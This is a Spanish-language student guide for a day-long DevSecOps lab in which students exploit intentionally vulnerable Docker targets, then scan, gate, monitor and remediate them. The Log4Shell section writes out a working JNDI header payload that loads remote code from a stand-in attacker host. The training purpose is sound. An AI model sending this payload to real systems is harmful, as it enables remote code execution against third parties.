# Guía del estudiante · Jornada de 10 horas · DevSecOps end-to-end

El objetivo del día: recorrer el ciclo completo de seguridad **sobre código que se
puede romper de verdad**. Vas a explotar una vulnerabilidad, verla bloqueada por un
pipeline, monitorearla en Grafana y cerrarla — y repetirlo con varias clases de
fallas. Todo con Docker en tu Ubuntu, sin instalar herramientas sueltas.

> ⚠️ Todo corre en `127.0.0.1` / Docker. Es software vulnerable a propósito. Nunca
> lo uses contra sistemas de terceros (Ley 1273 de 2009).

## Preparación (una vez)

```bash
# Ubuntu
sudo apt update && sudo apt install -y docker.io docker-compose-plugin make git
sudo usermod -aG docker $USER   # cierra sesión y vuelve a entrar
# clona el repo del curso y entra a seclab/
cd seclab && make labs
```

## El mapa del día

| Bloque | Horas | Qué haces | Entregable |
|---|---|---|---|
| 1 · Encuadre y setup | 1.0 | Docker listo, `make labs`, correr la animación `make cook` | entorno OK |
| 2 · **Log4Shell** | 1.5 | `make demo LAB=01-log4shell` → RCE; leer la cadena JNDI | captura del RCE |
| 3 · **php2shell** | 1.0 | `make demo LAB=02-php-upload-shell` → webshell | captura del `uid=www-data` |
| 4 · **Node: injection + deps** | 1.0 | `make demo LAB=03-node-cmd-injection` → RCE | captura del `uid=0` |
| 5 · **El escaneo** | 1.5 | `make scan-all` → entender el gate y los 3 escáneres | reporte con hallazgos |
| 6 · **CI/CD** | 1.0 | montar `ci/security-pipeline.yml` en un repo y ver bloquear un PR | PR en rojo |
| 7 · **Monitoreo** | 1.0 | `make monitor` → Grafana; re-escanear y ver métricas moverse | dashboard con datos |
| 8 · **Remediar + agente** | 1.5 | arreglar 1 falla por lab, `make triage`, re-escanear | alarmas **subsanadas** ↑ |
| 9 · Cierre | 0.5 | el ciclo completo en una frase | — |

> Los tiempos son guía; ajusta a tu ritmo. Lo importante es **cerrar el ciclo**:
> explotar → detectar → bloquear → monitorear → remediar → verificar.

## Bloque 2 · Log4Shell (ejemplo detallado)

```bash
make up LAB=01-log4shell
cd labs/01-log4shell
docker compose run --rm trigger -s \
  -H 'X-Api-Version: ${jndi:ldap://attacker-ldap:1389/Exploit}' http://victim:8080/
docker compose exec victim cat /tmp/pwned.txt   # <- evidencia del RCE
cd ../.. && make down LAB=01-log4shell
```
**Pregunta:** ¿por qué la red del lab es `internal: true`? ¿Qué defensa representa?

## Bloque 5 · El escaneo (lo que verás)

```bash
make scan-all
```
Heisenberg «cocina» el escaneo (secretos + SAST + SCA) y al final:
- un recuadro con el conteo por herramienta,
- los hallazgos destacados (severidad, regla, ubicación),
- **alarmas nuevas vs subsanadas**,
- el **gate**: `exit 1` si hay hallazgos (lo mismo que hará el CI).

**Pregunta:** ¿qué hallazgo bloqueó el gate que una persona habría dejado pasar?

## Bloque 8 · Remediar y verificar (el objetivo real)

1. Elige una falla (p. ej. el command injection de Node).
2. Aplícale la corrección del README del lab (`execFile` con lista de argumentos).
3. `make scan LAB=03-node-cmd-injection` otra vez.
4. Mira en Grafana cómo sube **alarmas subsanadas**. Eso es el ciclo cerrándose.

```bash
make triage   # el agente prioriza y sugiere el fix (aconseja, no decide)
```

## Entregable del día

En el repo de tu equipo, un `seguridad/jornada.md` con:
1. Las 3 capturas de RCE (un lab cada una).
2. El reporte del `make scan-all` (antes de remediar).
3. Qué remediaste y el reporte **después** (con alarmas subsanadas > 0).
4. Tres líneas: ¿qué cazó el gate?, ¿qué dijo el agente?, ¿qué deuda queda?

## Chuleta de comandos

```
make help            toda la ayuda
make labs            lista labs
make demo LAB=<x>    up + exploit + down
make scan LAB=<x>    escanea un lab
make scan-all        escanea todo + gate
make monitor         Grafana (http://localhost:3001, admin/seclab)
make triage          agente de triage
make down LAB=<x>    baja un lab
```
